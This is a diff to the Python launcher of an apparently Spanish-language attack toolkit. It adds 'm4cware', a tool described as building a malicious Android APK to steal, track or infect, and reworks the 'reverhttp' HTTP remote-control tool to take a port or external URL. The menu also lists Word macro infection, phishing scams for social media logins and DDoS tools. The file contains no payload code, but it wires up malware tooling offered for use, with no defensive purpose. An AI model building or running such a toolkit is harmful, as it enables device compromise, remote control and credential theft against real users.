@@ -19,6 +19,7 @@ scripts_h = """
 > macromaker   :: Genera macros personalizadas para documentos Word.
 > wordinfect   :: Inserta macros maliciosas en documentos Word (.docm).
 > reverhttp    :: Establece control remoto usando solicitudes HTTP.
+> m4cware      :: Recolecta, modifica o elimina informacion usando APK malicioso.
 
 [:: DDOS TOOLS ::]
 -------------------------------------------------
@@ -161,14 +162,22 @@ execute_s = {
         "--b: Scam a usar (ig para Instagram, fb para Facebook, tw para Twitter, go para Google, opcional)"
     ],
     "reverhttp": [
-        "reverseatak.py", 
+        reverhttp, 
         "a", 
         "[DESCRIPCION]\nEstablece un canal de control remoto basado en solicitudes HTTP y POST.\n\n"
-        "[USO]\npython3 fsh.py reverhttp\n\n"
-        "[PARAMETROS]\nSin parámetros adicionales."
+        "[USO]\npython3 fsh.py reverhttp --a <PORT|URL>\n\n"
+        "[PARAMETROS]\n--a PORT Para crear un host local y URL para host externo."
+    ],
+    "m4cware": [
+        m4cware,
+        "[DESCRIPCION]\nCrea un APK malicioso que puede ser usado para obtener, rastrear, o infectar\nmaquinas vulnerables.\n\n"
+        "[USO]\npython3 fsh.py m4cware"
     ]
 }
 
+GUI_scripts = [
+    "m4cware"
+]
 
 parse = argparse.ArgumentParser(usage=scripts_h)
 
@@ -182,8 +191,7 @@ arguments = parse.parse_args()
 
 try:
 
-    if arguments.tool in execute_s and arguments.a == None:
-
+    if arguments.tool in execute_s and arguments.a == None and arguments.tool not in GUI_scripts:
         print(execute_s[arguments.tool][2])
 
     # Se ejecutan dependiendo de la cantidad de parametros necesarios
@@ -201,6 +209,9 @@ try:
         
         if execute_s[arguments.tool][1] == "abcd":
             execute_s[arguments.tool][0](arguments.a, arguments.b, arguments.c, arguments.d)
+
+    elif arguments.tool in execute_s and arguments.tool in GUI_scripts: # Todo lo que este en GUI se ejecuta aqui
+        execute_s[arguments.tool][0]()
 
     else:
         print("[ERROR] Funcion no encontrada...")
